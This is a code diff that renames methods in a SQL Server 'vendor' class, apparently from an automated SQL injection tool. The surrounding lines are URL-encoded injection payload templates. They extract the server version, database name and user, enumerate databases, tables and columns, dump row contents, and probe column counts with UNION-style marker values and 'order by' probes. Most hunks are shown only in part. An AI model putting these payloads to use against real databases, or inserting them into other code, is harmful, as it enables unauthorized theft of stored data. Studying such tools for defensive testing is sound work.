@@ -25,13 +25,13 @@ public class SQLServerVendor extends AbstractVendorDefault {
     private static final Logger LOGGER = Logger.getLogger(SQLServerVendor.class);
 
     @Override
-    public String getSqlInfos() {
+    public String sqlInfos() {
         return
             "SELECT+@@version%2B'"+ SEPARATOR_SQL +"'%2BDB_NAME()%2B'"+ SEPARATOR_SQL +"'%2Buser%2B'"+ TRAIL_SQL +"'";
     }
 
     @Override
-    public String getSqlDatabases() {
+    public String sqlDatabases() {
         return
             "SELECT+" +
                 "replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(" +
@@ -46,7 +46,7 @@ public class SQLServerVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlTables(Database database) {
+    public String sqlTables(Database database) {
         return
             "SELECT+" +
                 "replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(" +
@@ -61,7 +61,7 @@ public class SQLServerVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlColumns(Table table) {
+    public String sqlColumns(Table table) {
         try {
             return
                 "SELECT+" +
@@ -86,7 +86,7 @@ public class SQLServerVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlRows(String[] columns, Database database, Table table) {
+    public String sqlRows(String[] columns, Database database, Table table) {
         String formatListColumn = StringUtil.join(columns, ",'')))%2b'%7f'%2bLTRIM(RTRIM(coalesce(");
         formatListColumn = "LTRIM(RTRIM(coalesce(" + formatListColumn + ",'')))";
 
@@ -164,13 +164,13 @@ public class SQLServerVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlNormal(String sqlQuery, String startPosition) {
+    public String sqlNormal(String sqlQuery, String startPosition) {
         return
             "(select'SQLi'%2Bsubstring((" + sqlQuery + ")," + startPosition + ",65536))";
     }
 
     @Override
-    public String getSqlCapacity(String[] indexes) {
+    public String sqlCapacity(String[] indexes) {
         return
             MediatorModel.model().getIndexesInUrl().replaceAll(
                 "1337(" + StringUtil.join(indexes, "|") + ")7331",
@@ -179,7 +179,7 @@ public class SQLServerVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlIndices(Integer nbFields) {
+    public String sqlIndices(Integer nbFields) {
         List<String> fields = new ArrayList<>(); 
         for (int i = 1 ; i <= nbFields ; i++) {
             fields.add("CONVERT(varchar,(1337"+ i +"7330%2b1))");
@@ -188,12 +188,12 @@ public class SQLServerVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlOrderBy() {
+    public String sqlOrderBy() {
         return "+order+by+1337--+";
     }
 
     @Override
-    public String getSqlLimit(Integer limitSQLResult) {
+    public String sqlLimit(Integer limitSQLResult) {
         return "and+rnum+BETWEEN+" + (limitSQLResult+1) + "+AND+65536";
     }
 }
